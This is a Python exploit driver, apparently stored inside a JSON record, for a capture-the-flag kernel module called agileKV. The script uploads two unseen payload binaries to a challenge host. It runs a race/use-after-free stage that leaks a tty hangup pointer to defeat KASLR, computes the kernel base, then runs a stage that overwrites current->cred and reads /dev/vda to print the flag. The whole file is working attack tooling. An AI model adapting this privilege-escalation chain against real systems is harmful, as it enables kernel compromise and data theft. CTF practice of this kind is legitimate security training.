        "code": "#!/usr/bin/env python3\n\"\"\"Solve agileKV using the race, tty leak, and forged RB-tree node payloads.\"\"\"\n\nimport argparse\nimport re\nimport sys\nfrom pathlib import Path\n\nimport transport\n\n\nHERE = Path(__file__).resolve().parent\nSTAGE1 = HERE / \"stage1\"\nSTAGE3 = HERE / \"stage3\"\nTTY_HANGUP_OFF = 0x00BB6120\nGUEST_PATH = \"/tmp/agile-probe\"\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"Exploit the agileKV CTF kernel module\")\n    parser.add_argument(\"--host\", required=True, help=\"current challenge instance hostname\")\n    parser.add_argument(\"--port\", type=int, default=443)\n    parser.add_argument(\"--attempts\", type=int, default=250000)\n    parser.add_argument(\"--batch-lines\", type=int, default=3)\n    parser.add_argument(\"--pacing\", type=float, default=0.015)\n    args = parser.parse_args()\n\n    if args.batch_lines < 1 or args.pacing < 0:\n        parser.error(\"--batch-lines must be positive and --pacing cannot be negative\")\n    for payload in (STAGE1, STAGE3):\n        if not payload.is_file():\n            parser.error(f\"missing payload: {payload}\")\n\n    io = transport.connect(args.host, args.port)\n    try:\n        stage1_path = transport.upload(\n            io, STAGE1, GUEST_PATH,\n            batch_lines=args.batch_lines, pacing=args.pacing,\n        )\n        print(\"[*] Stage 1: race/UAF and tty_struct KASLR leak\", flush=True)\n        out1 = transport.cmd(\n            io, f\"{stage1_path} {args.attempts}\", \"STAGE1_DONE\", timeout=240\n        )\n        print(out1.decode(\"utf-8\", errors=\"replace\")[-9000:], flush=True)\n\n        leaks = re.findall(rb\"hangup_func=([0-9a-f]{16})\", out1)\n        if not leaks:\n            raise RuntimeError(\"Stage 1 did not report a tty hangup pointer\")\n        hangup = int(leaks[-1], 16)\n        kernel_base = hangup - TTY_HANGUP_OFF\n        if kernel_base & 0xFFFFFF:\n            raise RuntimeError(f\"unexpected kernel base from leak: {kernel_base:#x}\")\n        print(f\"[+] hangup_func={hangup:#018x} kernel_base={kernel_base:#018x}\", flush=True)\n\n        stage3_path = transport.upload(\n            io, STAGE3, GUEST_PATH,\n            batch_lines=args.batch_lines, pacing=args.pacing,\n        )\n        print(\"[*] Stage 3: overwrite current->cred and read /dev/vda\", flush=True)\n        out3 = transport.cmd(\n            io, f\"{stage3_path} {kernel_base:#x}\", \"STAGE3_DONE\", timeout=180\n        )\n        print(out3.decode(\"utf-8\", errors=\"replace\")[-6000:], flush=True)\n\n        match = re.search(rb\"\\[FLAG\\] bytes=\\d+ text=([^\\r\\n]+)\", out3)\n        if not match:\n            raise RuntimeError(\"Stage 3 did not print a flag\")\n        print(f\"[+] FLAG: {match.group(1).decode('utf-8', errors='replace')}\", flush=True)\n        return 0\n    finally:\n        io.close()\n\n\nif __name__ == \"__main__\":\n    try:\n        raise SystemExit(main())\n    except (OSError, RuntimeError) as error:\n        print(f\"[-] {error}\", file=sys.stderr, flush=True)\n        raise SystemExit(1)\n"
